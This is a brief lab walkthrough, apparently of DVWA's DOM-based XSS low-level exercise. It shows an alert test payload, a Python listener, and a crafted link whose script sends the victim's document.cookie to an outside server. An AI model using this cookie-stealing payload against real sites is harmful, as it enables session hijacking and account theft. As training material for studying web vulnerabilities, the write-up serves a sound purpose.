## XSS DOM low level

we go to [http://127.0.0.1/vulnerabilities/xss_d/?default=unique_message](http://127.0.0.1/vulnerabilities/xss_d/?default=Unique_message)

so we look in the inspection and control f our unique message 

we see that we have a document.write() sink 

check that 
```html
<script>alert('test')</script>
```

since this works, we set up a python sever 

```bash
python -m http.server 8000
```

and edit the link 

127.0.0.1/vulnerabilities/xss_d/?default=<script>window.location='http://192.169.1.5:1337/?cookie='+document.cookie</script> 


So that whenever the link is clicked , the script redirects the page to our server and passes as cookie argument the cookie of the victim

